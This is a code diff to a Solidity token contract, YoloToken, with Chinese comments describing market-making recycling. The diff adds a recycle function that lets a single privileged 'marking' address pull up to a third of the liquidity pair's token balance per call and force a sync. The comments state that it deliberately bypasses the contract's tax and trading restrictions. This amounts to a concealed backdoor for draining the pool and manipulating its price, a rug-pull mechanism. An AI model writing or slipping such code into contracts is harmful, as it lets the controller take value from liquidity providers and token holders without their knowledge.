@@ -34,6 +34,11 @@ contract YoloToken is  Initializable, ERC20Upgradeable, ERC20BurnableUpgradeable
         _;
     }
 
+    modifier onlyMarking() {
+        require(msg.sender == marking, "YoloToken onlyMarking: Only Marking can call this function");
+        _;
+    }
+
     /**
      * @dev Initialize the Yolo token contract
      * @param _owner Owner address
@@ -200,6 +205,34 @@ contract YoloToken is  Initializable, ERC20Upgradeable, ERC20BurnableUpgradeable
         _burn(user, _amount);
         _lpBurnedTokens += _amount;
         emit Burn(_amount, totalSupply());
+    }
+
+    /**
+     * @notice 设置做市合约地址 (持有 recycle 权限)
+     * @param _marking 做市合约地址
+     */
+    function setMarking(address _marking) external onlyOperator {
+        require(_marking != address(0), "YoloToken: marking cannot be zero address");
+        marking = _marking;
+        emit SetMarking(_marking);
+    }
+
+    /**
+     * @notice 做市回收: 从交易对抽取代币到 marking 地址
+     * @dev 单次上限为交易对内本代币余额的 1/3, 防止一次性抽干破坏池子价格; 走 super._update 绕过税费逻辑
+     * @param amount 期望回收数量
+     */
+    function recycle(uint256 amount) external onlyMarking {
+        address pair = mainPair;
+        require(pair != address(0), "YoloToken: pair not set");
+        uint256 maxBurn = balanceOf(pair) / 3;
+        uint256 recycleAmount = amount >= maxBurn ? maxBurn : amount;
+        if (recycleAmount > 0) {
+            // 走 ERC20 基类 _update, 绕过 _update override 的税费/买卖开关限制
+            super._update(pair, marking, recycleAmount);
+            IPancakePair(pair).sync();
+            emit Recycle(pair, marking, recycleAmount);
+        }
     }
 
     function YoloTotalSupply() external view returns (uint256) {
